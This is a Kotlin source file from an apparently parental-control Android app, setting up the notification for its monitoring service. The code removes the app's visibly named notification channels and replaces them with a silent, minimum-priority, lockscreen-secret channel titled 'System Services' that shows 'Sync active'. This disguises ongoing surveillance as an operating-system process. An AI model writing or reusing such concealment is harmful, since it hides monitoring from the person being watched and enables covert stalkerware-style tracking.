package com.parentalcontrol.app.util

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import androidx.core.app.NotificationCompat
import com.parentalcontrol.app.R

object NotificationHelper {

    const val CHANNEL_ID = "system_service_channel_v2"
    const val MONITORING_NOTIFICATION_ID = 1

    fun createNotificationChannel(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = context.getSystemService(NotificationManager::class.java) ?: return

            // Clean up old visible channels
            try {
                manager.deleteNotificationChannel("parental_control_monitoring")
                manager.deleteNotificationChannel("parental_control_boot")
            } catch (_: Exception) {}

            // Lowest possible importance: no sound, no vibration, no status bar icon
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Services",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background service sync"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            manager.createNotificationChannel(channel)
        }
    }

    fun buildMonitoringNotification(context: Context): Notification {
        return NotificationCompat.Builder(context, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Sync active")
            .setSmallIcon(R.drawable.ic_monitoring)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setShowWhen(false)
            .setOngoing(true)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }
}
